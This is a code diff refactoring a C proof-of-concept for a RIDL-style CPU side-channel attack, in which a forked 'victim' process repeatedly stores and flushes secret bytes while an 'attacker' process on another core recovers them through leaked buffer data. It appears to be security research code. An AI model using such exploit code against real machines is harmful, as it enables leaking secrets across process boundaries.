@@ -1,41 +1,22 @@
 #include "../primitives/basic_primitives.h"
-#include <time.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
-#include <unistd.h>
-#include <pthread.h>
-#include <sched.h>
 #include <signal.h>
+#include <unistd.h>
 #include <sys/mman.h>
+#include "utils.h"
 
 
 #define REPS 200000
 #define WRITE_VALUE 42ull
 #define CYCLE_LENGTH 40000000
 
-int _page_size = 0x1000;
 
 int writer_cpu = 3, reader_cpu = 7, pid = 0;
 int hits[256];
 
-inline uint64_t time_convert(struct timespec *spec) { return (1000000000 * (uint64_t) spec->tv_sec) + spec->tv_nsec; }
-
-inline void lfb_fill(uint8_t value, void *destination) {
-    asm volatile(
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq %0, (%1)\n"
-    "mfence\n"
-    "movq $0, (%1)\n"
-    "mfence\n"
-    "clflush (%1)\n"
-    ::"r"((uint64_t) value), "r"(destination));
-}
-
-inline void *test_write(char *secret, int cycle_length) {
+inline void *victim(char *secret, int cycle_length) {
     set_processor_affinity(writer_cpu);
     uint64_t *destination = aligned_alloc(_page_size, _page_size);
 
@@ -48,15 +29,15 @@ inline void *test_write(char *secret, int cycle_length) {
         t = time_convert(&spec);
         while (time_convert(&spec) - t < cycle_length) {
             int j = 100;
-            while (j--) lfb_fill(secret[i], destination);
+            while (j--) store_and_flush(secret[i], destination);
             clock_gettime(CLOCK_REALTIME, &spec);
         }
     }
 
-    while (1) { lfb_fill(7, destination); }
+    while (1) { store_and_flush(7, destination); }
 }
 
-void test_read(void *mem, int cycle_length) {
+void attacker(void *mem, int cycle_length) {
     set_processor_affinity(reader_cpu);
 
     struct timespec spec;
@@ -104,10 +85,10 @@ int main() {
     ridl_init();
     pid = fork();
     if (!pid) {
-        test_write(secret, CYCLE_LENGTH);
+        victim(secret, CYCLE_LENGTH);
         return 0;
     }
-    test_read(mem, CYCLE_LENGTH);
+    attacker(mem, CYCLE_LENGTH);
     kill(pid, SIGKILL);
     usleep(10000);
 
